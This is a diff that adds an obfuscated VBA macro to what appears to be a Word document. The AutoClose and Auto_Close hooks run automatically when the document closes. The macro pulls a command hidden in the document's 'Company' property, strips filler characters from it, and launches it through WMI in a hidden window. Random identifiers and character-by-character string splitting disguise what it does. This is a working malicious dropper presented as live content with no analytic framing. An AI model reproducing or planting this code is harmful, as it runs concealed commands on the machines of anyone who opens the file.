@@ -1,0 +1,24 @@
+Sub Auto_Close()
+    wzfkbOCNnxGA
+End Sub
+
+Sub AutoClose()
+    wzfkbOCNnxGA
+End Sub
+
+Public Function wzfkbOCNnxGA() As Variant
+    Dim eMVBaKLXNfff As DocumentProperty
+    For Each eMVBaKLXNfff In ActiveDocument.BuiltInDocumentProperties
+        If eMVBaKLXNfff.Name = "C"&"o"&"m"&"p"&"a"&"n"&"y" Then
+            Dim rSFFRcJjeHgr As String
+            rSFFRcJjeHgr = Replace(eMVBaKLXNfff.Value, "}>]_+?$&[*)#!=-{%</(", "")
+            Const HIDDEN_WINDOW = 0
+            Set ludcCOHpflxV = GetObject("w"&"i"&"n"&"m"&"g"&"m"&"t"&"s"&":"&"\"&"\"&"."&"\"&"r"&"o"&"o"&"t"&"\"&"c"&"i"&"m"&"v"&"2")
+            Set qLpANVIXnCYH = ludcCOHpflxV.Get("W"&"i"&"n"&"3"&"2"&"_"&"P"&"r"&"o"&"c"&"e"&"s"&"s"&"S"&"t"&"a"&"r"&"t"&"u"&"p")
+            Set NYXUxTqnHyQA = qLpANVIXnCYH.SpawnInstance_
+            NYXUxTqnHyQA.ShowWindow = HIDDEN_WINDOW
+            Set sVfyjGxIDazU = GetObject("w"&"i"&"n"&"m"&"g"&"m"&"t"&"s"&":"&"\"&"\"&"."&"\"&"r"&"o"&"o"&"t"&"\"&"c"&"i"&"m"&"v"&"2"&":"&"W"&"i"&"n"&"3"&"2"&"_"&"P"&"r"&"o"&"c"&"e"&"s"&"s")
+            sVfyjGxIDazU.Create rSFFRcJjeHgr, Null, NYXUxTqnHyQA, vDbwlXjbGsWl
+        End If
+    Next
+End Function                                                                                                                                  
